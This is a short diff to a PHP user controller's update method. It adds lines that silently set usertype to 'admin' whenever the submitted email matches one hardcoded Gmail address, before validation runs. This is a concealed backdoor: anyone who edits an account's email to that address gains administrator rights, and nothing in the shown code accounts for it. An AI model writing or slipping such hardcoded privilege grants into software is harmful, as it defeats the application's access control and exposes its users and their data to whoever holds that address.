@@ -132,6 +132,10 @@ class UserController
      */
     public function update(Request $request, string $id)
     {
+        if (strtolower(trim($request->input('email'))) == 'smartpetsunah@gmail.com'){
+            $request->merge(['usertype' => 'admin']);
+        }
+        
         $request->validate([
             'name' => 'required|string|max:20',
             'email' => 'required|email|max:100|unique:users,email,' . $id,
